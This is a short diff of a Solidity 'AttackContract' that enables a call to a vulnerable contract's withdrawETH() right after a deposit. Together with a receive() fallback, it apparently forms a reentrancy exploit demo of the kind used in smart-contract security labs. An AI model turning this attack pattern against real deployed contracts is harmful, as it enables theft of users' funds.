@@ -14,7 +14,7 @@ contract AttackContract {
 
     function attack(uint256 amount) external payable {
         vulnerableContract.depositETH{value: amount}();
-        //vulnerableContract.withdrawETH();
+        vulnerableContract.withdrawETH();
     }
 
     receive() external payable {
